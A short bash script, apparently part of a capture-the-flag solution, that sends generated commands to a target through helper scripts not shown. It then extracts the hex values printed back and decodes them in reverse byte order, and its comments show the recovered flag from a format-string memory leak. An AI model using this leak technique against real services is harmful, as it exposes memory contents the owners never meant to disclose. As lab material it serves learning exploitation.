#!/bin/bash

./gencommands.sh >commands.txt
./connect.sh <commands.txt | grep '^<.*>$' | grep -v 'nil' | tr -d '<>' >hexdump.txt
while read line; do
  # rev due to endianness, we want to read it backwards.
  echo "${line} -> $(echo ${line} | xxd -r -p | rev)"
done <hexdump.txt

# You get this
# 0x696d655200000000 -> Remi
# 0x5443203a7265646e -> nder: CT
# 0x74616d726f667b46 -> F{format
# 0x5f676e697274735f -> _string_
# 0x5f6568745f726f66 -> for_the_
# 0x7d6e6977 -> win}

